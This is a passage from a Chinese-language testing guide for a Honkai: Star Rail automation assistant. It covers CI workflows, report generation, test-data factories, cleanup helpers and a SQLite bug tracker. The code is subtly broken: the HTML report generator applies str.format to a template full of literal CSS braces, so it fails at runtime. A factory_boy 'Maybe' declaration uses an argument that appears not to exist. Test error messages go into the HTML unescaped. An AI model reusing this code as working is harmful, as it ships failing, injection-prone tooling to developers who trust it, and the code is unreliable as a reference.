    - name: 运行集成测试
      run: |
        pytest tests/integration/ -v -m integration
    
    - name: 运行安全测试
      run: |
        pytest tests/security/ -v -m security
        bandit -r src/
    
    - name: 上传覆盖率报告
      uses: codecov/codecov-action@v3
      with:
        file: ./coverage.xml
        flags: unittests
        name: codecov-umbrella
    
    - name: 运行性能测试
      if: github.event_name == 'push' && github.ref == 'refs/heads/main'
      run: |
        pytest tests/performance/ -v -m performance
```

### 测试报告生成

```python
# scripts/generate_test_report.py
import json
import xml.etree.ElementTree as ET
from datetime import datetime
from pathlib import Path

def generate_html_report(test_results):
    """生成HTML测试报告"""
    html_template = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>测试报告</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 20px; }
            .summary { background: #f0f0f0; padding: 15px; border-radius: 5px; }
            .passed { color: green; }
            .failed { color: red; }
            .skipped { color: orange; }
            table { border-collapse: collapse; width: 100%; margin-top: 20px; }
            th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
            th { background-color: #f2f2f2; }
        </style>
    </head>
    <body>
        <h1>测试报告</h1>
        <div class="summary">
            <h2>测试摘要</h2>
            <p>生成时间: {timestamp}</p>
            <p>总测试数: {total}</p>
            <p class="passed">通过: {passed}</p>
            <p class="failed">失败: {failed}</p>
            <p class="skipped">跳过: {skipped}</p>
            <p>成功率: {success_rate:.2f}%</p>
        </div>
        
        <h2>详细结果</h2>
        <table>
            <tr>
                <th>测试用例</th>
                <th>状态</th>
                <th>执行时间</th>
                <th>错误信息</th>
            </tr>
            {test_rows}
        </table>
    </body>
    </html>
    """
    
    # 计算统计信息
    total = len(test_results)
    passed = sum(1 for r in test_results if r['status'] == 'passed')
    failed = sum(1 for r in test_results if r['status'] == 'failed')
    skipped = sum(1 for r in test_results if r['status'] == 'skipped')
    success_rate = (passed / total * 100) if total > 0 else 0
    
    # 生成测试行
    test_rows = []
    for result in test_results:
        status_class = result['status']
        error_msg = result.get('error', '')
        row = f"""
        <tr>
            <td>{result['name']}</td>
            <td class="{status_class}">{result['status']}</td>
            <td>{result['duration']:.3f}s</td>
            <td>{error_msg}</td>
        </tr>
        """
        test_rows.append(row)
    
    return html_template.format(
        timestamp=datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        total=total,
        passed=passed,
        failed=failed,
        skipped=skipped,
        success_rate=success_rate,
        test_rows=''.join(test_rows)
    )

def parse_junit_xml(xml_file):
    """解析JUnit XML报告"""
    tree = ET.parse(xml_file)
    root = tree.getroot()
    
    test_results = []
    
    for testcase in root.findall('.//testcase'):
        result = {
            'name': testcase.get('name'),
            'classname': testcase.get('classname'),
            'duration': float(testcase.get('time', 0))
        }
        
        if testcase.find('failure') is not None:
            result['status'] = 'failed'
            result['error'] = testcase.find('failure').text
        elif testcase.find('error') is not None:
            result['status'] = 'failed'
            result['error'] = testcase.find('error').text
        elif testcase.find('skipped') is not None:
            result['status'] = 'skipped'
            result['error'] = ''
        else:
            result['status'] = 'passed'
            result['error'] = ''
        
        test_results.append(result)
    
    return test_results

if __name__ == '__main__':
    # 解析测试结果
    junit_file = Path('test-results.xml')
    if junit_file.exists():
        test_results = parse_junit_xml(junit_file)
        
        # 生成HTML报告
        html_report = generate_html_report(test_results)
        
        # 保存报告
        report_file = Path('test-report.html')
        report_file.write_text(html_report, encoding='utf-8')
        
        print(f"测试报告已生成: {report_file.absolute()}")
    else:
        print("未找到测试结果文件")
```

## 测试数据管理

### 测试数据工厂

```python
# tests/factories.py
import factory
from datetime import datetime, timedelta
from src.models.task import Task
from src.models.execution import TaskExecution

class TaskFactory(factory.Factory):
    class Meta:
        model = Task
    
    id = factory.Sequence(lambda n: f"task_{n:04d}")
    name = factory.Faker('sentence', nb_words=3)
    task_type = factory.Iterator(['daily', 'weekly', 'custom'])
    created_at = factory.LazyFunction(datetime.now)
    updated_at = factory.LazyAttribute(lambda obj: obj.created_at + timedelta(minutes=1))
    parameters = factory.Dict({
        'target': factory.Faker('word'),
        'priority': factory.Iterator([1, 2, 3, 4, 5])
    })
    status = factory.Iterator(['pending', 'running', 'completed', 'failed'])

class TaskExecutionFactory(factory.Factory):
    class Meta:
        model = TaskExecution
    
    id = factory.Sequence(lambda n: f"exec_{n:06d}")
    task = factory.SubFactory(TaskFactory)
    start_time = factory.LazyFunction(datetime.now)
    end_time = factory.LazyAttribute(lambda obj: obj.start_time + timedelta(minutes=5))
    status = factory.Iterator(['completed', 'failed', 'cancelled'])
    result = factory.Dict({
        'operations_count': factory.Faker('random_int', min=1, max=100),
        'success_rate': factory.Faker('pyfloat', min_value=0.5, max_value=1.0),
        'errors': factory.List([])
    })
    error_message = factory.Maybe(
        'status',
        yes_declaration=factory.Faker('sentence'),
        no_declaration=None,
        condition=lambda status: status == 'failed'
    )
```

### 测试数据清理

```python
# tests/utils/data_cleanup.py
import shutil
import tempfile
from pathlib import Path
from contextlib import contextmanager

@contextmanager
def temporary_test_environment():
    """创建临时测试环境"""
    temp_dir = tempfile.mkdtemp(prefix='xingtie_test_')
    original_config_dir = Path.home() / '.xingtie'
    test_config_dir = Path(temp_dir) / '.xingtie'
    
    try:
        # 创建测试配置目录
        test_config_dir.mkdir(parents=True, exist_ok=True)
        
        # 设置环境变量
        import os
        os.environ['XINGTIE_CONFIG_DIR'] = str(test_config_dir)
        os.environ['XINGTIE_DATA_DIR'] = str(test_config_dir / 'data')
        
        yield test_config_dir
        
    finally:
        # 清理
        shutil.rmtree(temp_dir, ignore_errors=True)
        if 'XINGTIE_CONFIG_DIR' in os.environ:
            del os.environ['XINGTIE_CONFIG_DIR']
        if 'XINGTIE_DATA_DIR' in os.environ:
            del os.environ['XINGTIE_DATA_DIR']

class DatabaseTestCase:
    """数据库测试基类"""
    
    def setup_method(self):
        """每个测试方法前的设置"""
        self.db_file = tempfile.NamedTemporaryFile(delete=False, suffix='.db')
        self.db_file.close()
        
        from src.data.database import Database
        self.db = Database(self.db_file.name)
        self.db.create_tables()
    
    def teardown_method(self):
        """每个测试方法后的清理"""
        if hasattr(self, 'db'):
            self.db.close()
        
        import os
        if os.path.exists(self.db_file.name):
            os.unlink(self.db_file.name)
```

## 缺陷管理

### 缺陷分类

| 严重级别 | 描述 | 处理时间 | 示例 |
|---------|------|----------|------|
| Critical | 系统崩溃、数据丢失 | 24小时内 | 应用启动失败、数据库损坏 |
| High | 核心功能无法使用 | 3天内 | 游戏检测失败、任务执行错误 |
| Medium | 功能部分异常 | 1周内 | 界面显示问题、性能下降 |
| Low | 轻微问题 | 下个版本 | 文字错误、界面美化 |

### 缺陷报告模板

```markdown
## 缺陷报告

**缺陷ID**: BUG-YYYY-NNNN
**报告人**: [姓名]
**报告时间**: [YYYY-MM-DD HH:MM:SS]
**严重级别**: [Critical/High/Medium/Low]
**优先级**: [P1/P2/P3/P4]

### 环境信息
- 操作系统: Windows 11 Pro
- Python版本: 3.13.0
- 应用版本: 1.0.0
- 游戏版本: 1.3.0

### 缺陷描述
[简洁明确地描述问题]

### 重现步骤
1. 启动应用程序
2. 点击"创建任务"按钮
3. 选择"每日任务"类型
4. 点击"保存"按钮

### 期望结果
[描述期望的正确行为]

### 实际结果
[描述实际发生的错误行为]

### 附件
- 错误截图: [screenshot.png]
- 日志文件: [error.log]
- 配置文件: [config.json]

### 其他信息
[任何其他相关信息]
```

### 缺陷跟踪工具

```python
# scripts/bug_tracker.py
import json
import sqlite3
from datetime import datetime
from dataclasses import dataclass, asdict
from typing import List, Optional

@dataclass
class Bug:
    id: str
    title: str
    description: str
    severity: str  # Critical, High, Medium, Low
    priority: str  # P1, P2, P3, P4
    status: str    # Open, In Progress, Resolved, Closed
    reporter: str
    assignee: Optional[str]
    created_at: datetime
    updated_at: datetime
    tags: List[str]

class BugTracker:
    def __init__(self, db_path: str = 'bugs.db'):
        self.db_path = db_path
        self._init_database()
    
    def _init_database(self):
        conn = sqlite3.connect(self.db_path)
        conn.execute('''
            CREATE TABLE IF NOT EXISTS bugs (
                id TEXT PRIMARY KEY,
                title TEXT NOT NULL,
                description TEXT,
                severity TEXT,
                priority TEXT,
                status TEXT,
                reporter TEXT,
                assignee TEXT,
                created_at TEXT,
                updated_at TEXT,
                tags TEXT
            )
        ''')
        conn.commit()
        conn.close()
    
    def create_bug(self, bug: Bug) -> str:
        conn = sqlite3.connect(self.db_path)
        conn.execute('''
            INSERT INTO bugs VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            bug.id, bug.title, bug.description, bug.severity,
            bug.priority, bug.status, bug.reporter, bug.assignee,
            bug.created_at.isoformat(), bug.updated_at.isoformat(),
            json.dumps(bug.tags)
        ))
        conn.commit()
        conn.close()
        return bug.id
    
    def get_bugs_by_status(self, status: str) -> List[Bug]:
        conn = sqlite3.connect(self.db_path)
        cursor = conn.execute(
            'SELECT * FROM bugs WHERE status = ? ORDER BY created_at DESC',
            (status,)
        )
        bugs = [self._row_to_bug(row) for row in cursor.fetchall()]
        conn.close()
        return bugs
    
    def _row_to_bug(self, row) -> Bug:
        return Bug(
            id=row[0],
            title=row[1],
            description=row[2],
            severity=row[3],
            priority=row[4],
            status=row[5],
            reporter=row[6],
            assignee=row[7],
            created_at=datetime.fromisoformat(row[8]),
            updated_at=datetime.fromisoformat(row[9]),
            tags=json.loads(row[10])
        )
```

## 测试报告

### 测试执行报告

```python
# scripts/test_execution_report.py
import json
from datetime import datetime
from pathlib import Path

class TestExecutionReport:
    def __init__(self):
        self.start_time = None
        self.end_time = None
        self.test_results = []
        self.environment_info = {}
        self.coverage_info = {}
    
    def start_execution(self):
        self.start_time = datetime.now()
        self.environment_info = self._collect_environment_info()
    
    def end_execution(self):
        self.end_time = datetime.now()
    
    def add_test_result(self, test_name: str, status: str, 
                       duration: float, error: str = None):
        self.test_results.append({
            'name': test_name,
            'status': status,
            'duration': duration,
            'error': error,
            'timestamp': datetime.now().isoformat()
        })
    
    def set_coverage_info(self, coverage_data: dict):
        self.coverage_info = coverage_data
    
    def generate_report(self) -> dict:
        total_tests = len(self.test_results)
        passed_tests = sum(1 for r in self.test_results if r['status'] == 'passed')
        failed_tests = sum(1 for r in self.test_results if r['status'] == 'failed')
        skipped_tests = sum(1 for r in self.test_results if r['status'] == 'skipped')
        
        total_duration = sum(r['duration'] for r in self.test_results)
        execution_duration = (self.end_time - self.start_time).total_seconds()
        
        return {
            'summary': {
                'total_tests': total_tests,
                'passed': passed_tests,
                'failed': failed_tests,
                'skipped': skipped_tests,
                'success_rate': (passed_tests / total_tests * 100) if total_tests > 0 else 0,
                'total_duration': total_duration,
                'execution_duration': execution_duration
            },
            'execution_info': {
                'start_time': self.start_time.isoformat(),
                'end_time': self.end_time.isoformat(),
                'environment': self.environment_info
            },
            'test_results': self.test_results,
            'coverage': self.coverage_info
        }
    
    def _collect_environment_info(self) -> dict:
        import platform
        import sys
        
        return {
            'python_version': sys.version,
            'platform': platform.platform(),
            'processor': platform.processor(),
            'architecture': platform.architecture(),
            'hostname': platform.node()
        }
    
    def save_report(self, file_path: str):
        report = self.generate_report()
        Path(file_path).write_text(json.dumps(report, indent=2, ensure_ascii=False))
```

## 持续集成

### 测试流水线配置

```yaml
# .github/workflows/comprehensive-test.yml
name: 综合测试流水线

on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main ]
  schedule:
    - cron: '0 2 * * *'  # 每天凌晨2点运行

env:
  PYTHON_VERSION: '3.13'
  CACHE_VERSION: v1

jobs:
  lint-and-format:
    name: 代码质量检查
    runs-on: windows-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: 设置Python
        uses: actions/setup-python@v4
        with:
          python-version: ${{ env.PYTHON_VERSION }}
      
      - name: 安装依赖
        run: |
          pip install black mypy bandit flake8
          pip install -r requirements-dev.txt
      
      - name: 代码格式检查
        run: black --check src/ tests/
      
      - name: 类型检查
        run: mypy src/
      
      - name: 安全检查
        run: bandit -r src/
      
      - name: 代码风格检查
        run: flake8 src/ tests/

  unit-tests:
    name: 单元测试
    runs-on: windows-latest
    needs: lint-and-format
    strategy:
      matrix:
        python-version: ['3.11', '3.12', '3.13']
    
    steps:
      - uses: actions/checkout@v4
      
      - name: 设置Python ${{ matrix.python-version }}
        uses: actions/setup-python@v4
        with:
          python-version: ${{ matrix.python-version }}
      
      - name: 缓存依赖
        uses: actions/cache@v3
        with:
          path: ~/.cache/pip
          key: ${{ runner.os }}-pip-${{ env.CACHE_VERSION }}-${{ hashFiles('requirements-dev.txt') }}
      
      - name: 安装依赖
        run: |
          pip install --upgrade pip
          pip install -r requirements-dev.txt
      
      - name: 运行单元测试
        run: |
          pytest tests/unit/ -v --cov=src --cov-report=xml --cov-report=html
      
      - name: 上传覆盖率报告
        if: matrix.python-version == '3.13'
        uses: codecov/codecov-action@v3
        with:
          file: ./coverage.xml
          flags: unittests

  integration-tests:
    name: 集成测试
    runs-on: windows-latest
    needs: unit-tests
    
    steps:
      - uses: actions/checkout@v4
      
      - name: 设置Python
        uses: actions/setup-python@v4
        with:
          python-version: ${{ env.PYTHON_VERSION }}
      
      - name: 安装依赖
        run: |
          pip install -r requirements-dev.txt
      
      - name: 运行集成测试
        run: |
          pytest tests/integration/ -v -m integration

  e2e-tests:
    name: 端到端测试
    runs-on: windows-latest
    needs: integration-tests
    if: github.event_name == 'push' && github.ref == 'refs/heads/main'
    
    steps:
      - uses: actions/checkout@v4
      
      - name: 设置Python
        uses: actions/setup-python@v4
        with:
          python-version: ${{ env.PYTHON_VERSION }}
      
      - name: 安装依赖
        run: |
          pip install -r requirements-dev.txt
      
      - name: 运行端到端测试
        run: |
          pytest tests/e2e/ -v -m e2e --maxfail=1

  performance-tests:
    name: 性能测试
    runs-on: windows-latest
    needs: integration-tests
    if: github.event_name == 'schedule' || (github.event_name == 'push' && github.ref == 'refs/heads/main')
    
    steps:
      - uses: actions/checkout@v4
      
      - name: 设置Python
        uses: actions/setup-python@v4
        with:
          python-version: ${{ env.PYTHON_VERSION }}
      
      - name: 安装依赖
        run: |
          pip install -r requirements-dev.txt
      
      - name: 运行性能测试
        run: |
          pytest tests/performance/ -v -m performance
      
      - name: 上传性能报告
        uses: actions/upload-artifact@v3
        with:
          name: performance-report
          path: performance-report.html

  security-tests:
    name: 安全测试
    runs-on: windows-latest
    needs: unit-tests
    
    steps:
      - uses: actions/checkout@v4
      
      - name: 设置Python
        uses: actions/setup-python@v4
        with:
          python-version: ${{ env.PYTHON_VERSION }}
      
      - name: 安装依赖
        run: |
          pip install -r requirements-dev.txt
      
      - name: 运行安全测试
        run: |
          pytest tests/security/ -v -m security
      
      - name: 依赖安全扫描
        run: |
          pip install safety
          safety check

  test-report:
    name: 生成测试报告
    runs-on: windows-latest
    needs: [unit-tests, integration-tests, security-tests]
    if: always()
    
    steps:
      - uses: actions/checkout@v4
      
      - name: 设置Python
        uses: actions/setup-python@v4
        with:
          python-version: ${{ env.PYTHON_VERSION }}
      
      - name: 下载测试结果
        uses: actions/download-artifact@v3
        with:
          path: test-results/
      
      - name: 生成综合报告
        run: |
          python scripts/generate_test_report.py
      
      - name: 上传测试报告
        uses: actions/upload-artifact@v3
        with:
          name: test-report
          path: test-report.html
```

---

## 总结

本测试指南提供了崩坏星穹铁道自动化助手项目的完整测试策略和实施方案，包括：

### 核心测试原则
1. **测试金字塔**: 50%单元测试 + 30%集成测试 + 15%E2E测试 + 5%手工测试
2. **自动化优先**: 最大化自动化测试覆盖率
3. **持续集成**: 集成到CI/CD流水线
4. **质量保证**: 代码覆盖率≥90%，核心模块≥95%

### 测试覆盖范围
- **功能测试**: 验证所有功能正确性
- **性能测试**: 确保系统性能指标
- **安全测试**: 保障系统安全性
- **兼容性测试**: 验证多环境兼容性
- **用户界面测试**: 确保良好用户体验

### 工具和技术
- **测试框架**: pytest, unittest
- **GUI测试**: PyQt6测试工具, PyAutoGUI
- **性能测试**: 自定义性能监控工具
- **安全测试**: bandit, safety
- **CI/CD**: GitHub Actions

### 质量保证
- **代码覆盖率监控**: 实时跟踪测试覆盖率
- **自动化报告**: 生成详细的测试报告
- **缺陷管理**: 完整的缺陷跟踪流程
- **持续改进**: 基于测试结果持续优化

通过遵循本指南，可以确保项目的高质量交付和长期稳定运行。

---

**文档版本**: 1.0  
**最后更新**: 2024年1月  
**维护者**: 测试团队